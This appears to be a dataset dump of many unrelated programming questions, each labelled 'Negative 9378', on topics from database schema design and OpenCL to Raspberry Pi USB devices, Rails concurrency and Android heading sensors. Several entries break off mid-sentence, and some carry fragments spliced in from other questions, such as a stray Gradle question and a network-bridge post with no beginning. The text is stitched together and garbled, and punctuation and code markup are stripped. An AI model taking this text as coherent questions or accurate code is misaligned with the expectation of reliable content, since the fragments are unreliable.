Negative 9378 pIm working on a fansite about collectible figures, and I want to build a checklist that can help my users track what they do and dont have. As of the current design I have in mind, Id basically have a boolean for each figure  1 for Have it and 0 otherwise. Currently there are about 250 figures to account for, so Id have that many columns and each would hold a boolean value, and then in the future I would tack on more columns as more figures are introduced. My gut tells me, however, that having several hundred columns is poor form.p  pAs a way of cleaning things up, I though about converting the whole thing into one long hex string so 4 bits worth of booleans per character, or about 75 characters for the current length of the entire list, and then just encodingdecoding it as necessary. While thatd definitely make my rows a lot shorter, it would prevent me from doing things like searching the database for users that have X figurine, in case thats something I would eventually want to do.p  pTaking all this into account, I have a few questionsp  ol lipWould having tons of columns of booleans like this be a cardinal sin Would the performance impact be very significant, taking into account that the columns are basically holding the smallest possible data typepli lipIs there another better way of saving such long lists of booleans in a database that hasnt occurred to mepli lipIf I wanted to, instead of booleans, have a number that can represent a few different states i.e., Have, Dont Have, and Want to give the checklist more functionality, how might that affect the way I handle this problempli ol

Negative 9378 pIm refactoring my iOS OpenGLbased rendering pipeline. My pipeline consist of many rendering steps, hence I need a lot of intermediate textures to render to and read from. Those textures are of various types unsigned byte and half float and may posses a different number of channels.p  pTo save memory and allocation effort I recycled textures that were used by previous steps in the pipeline and are no longer needed. In my previous implementation I did that on my own.p  pIn my new implementation I want to use the APIs provided by the Core Video framework for that especially since they provide much faster access to the texture memory from the CPU.

Negative 9378 pI have a hierarchical Kendo grid that is bound to knockout using the knockoutkendo library. Everything works fine until the top level binding changes. p  pThis is the scenario I have a list of reports. You can only view one report at a time. Each report has a list of documents, each document has a list of pages, and each page has a list of lines.p  pI have a grid that shows Documents     Pages          Linesp  pHere is a JS Fiddle that demonstrates this scenario a hrefhttpjsfiddle.netkc5bL7yv2 relnofollowhttpjsfiddle.netkc5bL7yv2ap  pThis binds properly the first time, but when you change to another report, there is an error caused by the knockoutkendo library. From what I can tell, its because the Knockout binding change causes the nested grids to be removed from the DOM, but knockoutkendo has a destroy method that gets triggered. It doesnt check to see if the element still exists on the DOM and calls Kendos destroy method. This also doesnt check to see if the element still exists, and then fails.p  pI was able to fix this by changing the destroy binding in binding.setup in knockoutkendo to check to see if the element is null before calling destroyp  pBEFOREp  precodeko.utils.domNodeDisposal.addDisposeCallbackelement, function       widget.destroy  codepre  pAFTERp  precodeko.utils.domNodeDisposal.addDisposeCallbackelement, function       if widget.element  null          widget.destroy       codepre  pIs there any other way I can fix this without modifying the knockoutkendo libraryp  pNOTE I know I can do this if I stopped using the knockout templates, but this is just a simple example of a much more complex grid.

Negative 9378 pUPDATE codeclEnqueueReadBuffercommandqueue, cmemobj, CLTRUE, 0, LISTSIZE  sizeofdouble, C, 0, NULL, NULLcode is returning 5, codeCLOUTOFRESOURCEScode. This funcitoncall should never return thisp  pIve started using OpenCL and have come across a problem. If I allow a for loop in the kernel to run 10000 times I get all of C to be 0 if I allow the loop to run for 8000 the results are all correct.p  pI have added waits around the kernel to ensure it completes, thinking I was pulling the data out before completion and have tried both Clwaitforevent and CLFinish. No errors are signalled by any of the calls. I when I used ints the for loop would work at a size of 4000000. Float and doubles have the same problem however floats work at 10000, but not at 20000, when I used the floats I removed codepragma OPENCL EXTENSION clkhrfp64  enablecode to check that wasnt the problem.p  pIs this some weird memory thing, Im I using OpenCL wrong I realise that in most kernels I wount be implementing for loops like this, but this seems like an issue. I have also removed codeprivatecode to see if that was the problem, no change. So is there a limit on the size of for loops in OpenCL kernels Is is hardware specific Or is this a bugp  pThe kernel is a simple kernel, which adds 2 arrays AB together and outputs another C. In order to get a feel for performance I put a for loop around each calculation to slow it upincrease the number of operations per run through.p  pThe code for the kernel is as followsp  precodepragma

Negative 9378 pIve been using eclipse for a while and I have noticed something quite annoying. If I am entering arguments for a function and I hit comma while typing a string, eclipse advances to the next argument rather than typing a comma and the only way to enter a comma is to ether copy an existing comma in the editor with the clipboard or to hit commatab until the argument entering system is disengaged. Does anyone know how I could disable this feature comma or the whole argument entering assist There is nothing in the key binding settings.p

Negative 9378 pI am trying to understand this function with little to no avail.

As of right now I am just including the search space I know the number is in, but what if I dont or I am not sure of the list length Otherwise, I understand the recursion process going on here as well as the need for low and high being arguments.

Is ant or maven prerequisite in order to learn gradlep
Negative 9378 pIm having a massive performance issue on a view hierarchy with many custom views, some of these views are custom slider bars and some others are custom switches ONOFF plus some TextViews and ImageViews, the switches are similar to the android default switches but with some customization, basically my custom Switch is a LinearLayout subclass that mimics androids Switch, so the user can slide the thumb from ON to OFF and vice versa.p  pI traced down the problem to the simple fact that when I start sliding the switch thumb, every other view in the hierarchy is invalidated and onMeasureonLayout are called for each view, basically the whole activity view hierarchy is readrawn at every touch event on the switch.... p  pHow can this be Any idea Someone had similar problems p

Negative 9378 pProject is a PHP  Web portal running on a PI model B to drive an Arduino via a standard USB interface using the PHPserial library. p  pRaspbian GNULinux 7 connected to Arduino Uno via standard USB cable. p  pSummary, everting works fine after unplugging and reinserting USB lead. However after booting the PI a display of the serial devices via a command line dir dev shows no ttyUSBn device. When I unplug the USB cable and plug it back in then dir dev shows a ttyUSB0 device.p  pSo my question is why does the device not initialise properly at boot and how can I correct this given that this is a home automation project and reinserting the USB plug after each reboot is not practical.p  pMany thanks for your advice. p

Negative 9378 pIm writing a client and server that communicates through Unix Domain Sockets for a task in POSIX Development class, just to learn the concept. What happens is that the client sends commands to the server, and the server parses them and responds with an answer. My problem is that the first query to the server isnt received by the clients, unlike the rest of them.p  pTo be more clear, the first query to a given server instance isnt received by the client, if I close the client instance and open a new one, the first query will be received.

Negative 9378 pHi im looking at the string conversion methods in c  codestrtolcode, codestrtollcode, codestrtoulcode, codeatolcode etc.  It seems  every single one of them will return a code0code or code0.0code as a result for a string that was impossible to convert.  Assuming that code0code is a completely valid correct input for my  program how do I avoid converting nonsense strings to zero and make for example them throw some exception instead Are there ready made functions that perform that way or do I have to wrap these with some of my own code. Also could anybody explain me what might the reasons be that these functions are designed like this Why build in the trouble of  separating nonsense string parse result from honestogod strong0strong string parse resultsp
Negative 9378 pIm currently working on an embedded system, and in order to meet time constraints Ive needed to lock some code in cache. Ive placed all the functions I will need to be locked cache into the section MEMORYCACHEABLE by using the section variable attribute.p  pBecause the board Im using sets memory attributes for 1 megabyte chunks, Ive made MEMORYCACHEABLE 1MB in size.p  pWhen it comes to actually locking the code in cache, I need to determine the high address for the code inside of MEMORYCACHEABLE, since it does not occupy the entire memory space and I dont want to lock unused memory in cache.p  pThe way Ive been doing this is by using a placeholder in MEMORYCACHEABLE, that is defined in my C code after all of the other function placed in MEMORYCACHEABLE. Every time Ive debugged, Ive confirmed that the placeholder has a higher address than the other function. Ive been using this value as the high address, but it seems a little hacky.p  pI know theres no standard way of determining the size of a C function at runtime, but is there a more straightforward way to discover the high address of the code in this specific memory sectionp  pAlso, Im crosscompiling using armxilinxeabigcc.p  pThanksp

Negative 9378 pLets say we have some layer above service layer, with web controllers for example. Service layer is in turn above DAORepo layer. In the upper layer the service calls are used alongside repo calls.

The idea is that a client on tap0 will be able to talk to a client on tap1 and viceversa.p  pThere is no physical NIC involved in the bridge and the Bridge interface is setup with no ipnetmaskbroadcast.p  pI am able to ping between the 2 when they are both connected however I see no traffic when trying to tcpdump the bridge interface.p  pI am a bit confused on some thingsp  ol lipDo I need to have an ip configured on the bridge interface at all I dont quite see the reason for it as all it will do is to make to virtual interfaces talk to each otherpli lipIs the fact that the bridge interface does not have an assigned ipnetmaskbroadcast the reason I am not able to see the ping traffic on the bridge interface when tcpdumping that interfacepli lipIf the answer to number 2 is Yes, I assume that it is not either possible to use iptables to blockallow traffic on that interface, correct If so is there any other way to accomplish what one would do with iptables on an interface like thatpli ol

Negative 9378 pI have 2 sets of data stored in 2 different sheets. I need to run an analysis which prints out the strongnonduplicatestrong rows i.e. row is present in one and not the other found in the sheets and print them in a new sheet.p  pI can do the comparison fine  it is relatively simple with ranges and the codeFor Nextcode method. I currently store the nonduplicates in 2 different collections, each representing the nonduplicates in each sheet. However I am having trouble deciding how to proceed with pasting the duplicate rows on the new sheet.p  pI thought about storing the entire row into a collection but printing the row out of the collection in the new sheet seems nontrivial I would have to determine the size of the collection, set the appropriate range and then iterate through the collection and print them out. I would also like to truncate this data which would add another layer of complexity.p  pThe other method I thought was simply storing the row number and using codeRange.Select.Copycode and codePasteSpecialcode. The advantage of this is that I can truncate however much I wish, however this seems incredibly hacky to me essentially using VBA to simulate user input and I am not sure on performance hits.p  pWhich way should I proceedp

Negative 9378 ptldr Many Rails apps or one VertxPlay appp  pIve been having discussions with other members of my team on the pros and cons of using an async app server such as the Play Framework built on Netty versus spinning up multiple instances of a Rails app server.p  pI know that Netty is asynchronousnonblocking, meaning during a database query, network request, or something similar an async call will allow the event loop thread to switch from the blocked request to another request ready to be processedserved. This will keep the CPUs busy instead of blocking and waiting.p  pIm arguing in favor or using something such as the Play Framework or Vertx.io, something that is nonblocking... Scalable. My team members, on the other hand, are saying that you can get the same benefit by using multiple instances of a Rails app, which out of the box only comes with one thread and doesnt have true concurrency as do apps on the JVM. They are saying just use enough app instances to match the performance of one Play application or however many Play apps we use, and when a Rails app blocks the OS will switch processes to a different Rails app. In the end, they are saying that the CPUs will be doing the same amount of work and we will get the same performance.p  pSo here are my questionsp  ul liAre there any logical fallacies in the arguments above Would the OS manage the Rails app instances as well as Netty which also runs on the JVM, which maps threads to cores very well manages requests in its event loopli liWould the OS be as performant in switching on blocking calls as would something like Netty or Vertx, or even something built on Rubys own EventMachineli liWith enough Rails app instances to match the performance Play apps, would there be a cost noticeable cost difference in running the servers If there are no cost difference it wouldnt really matter what method is used, in my opinion. Shoot if it was cheaper financially to run up a million Rails apps than one Play app I would rather do that. li liWhat are some other benefits to using either of these approaches that I may be failing to ask aboutli ul

Negative 9378 pI have a simple responsive webpage that can run in two columns, with css for each div beingp  precode.half    width 45   minwidth 300px   float left  codepre  pFor wide screens each div column gets half the width, for narrower screens the columns compress until they reach 300px, and then they wrap.  Basically works OK.p  pHowever, when the screen is 400px wide say the columns are still compressed to 300px.  Because half of  400px is 200px, so minwidth of 300px takes priority.

Negative 9378 pI am currently working on an algorithm which requires an accurate estimate of the heading of the mobile device. For the development in iOS, I do not have to estimate the user heading as the framework already provides the value of codetrueHeadingcode via CoreLocation framework. So I do not have to implement my own fusion algorithm. The beauty of this codetrueHeadingcode is that it is very accurate and very stable, specially when the device is resting. This enables me to troubleshoot my algorithm. p  pNow, I am trying to implement my algorithm in Android and I have met a roadblock that Android does not provide anything like codetrueHeadingcode, or at least I am not aware of it. In this case, I need to use codeTYPEROTATIONVECTORcode which is very unstable, due to use of Magnetometers. p  pDoes anyone know if Android provides something like codetrueHeadingcode or has anybody used a better algorithm for accurate heading estimation in Android p  pI have tried to install several compass apps in Android to see their performance but none reported accurate readings. p  pPS I have tried my level best to explain my problem.

Negative 9378 pI have a clustermanager.py script that has two classes  one is a thread manager object, that is essentially responsible for taking a list of tasks that are passed to one of the classs function, filling a queue and assigning threads to the items in the queue. p  precodeimport threading import queue import requests import sys  import http  from Jaws2Engine.JawsObjects import jawsmanifest from Jaws2Engine.JawsCore import jawsframework, shelltask, databasetask  from PyQt5 import QtCore  global criticalerror criticalerror  ONERROR  class threadmanagerobject     def initself         self.threads  list         self.taskqueue  queue.Queue         self.resultqueue  queue.Queue      def messageReceivedself, message         printerror message in thread manager s  message         if message  criticalerror             printA critical error has occurred.
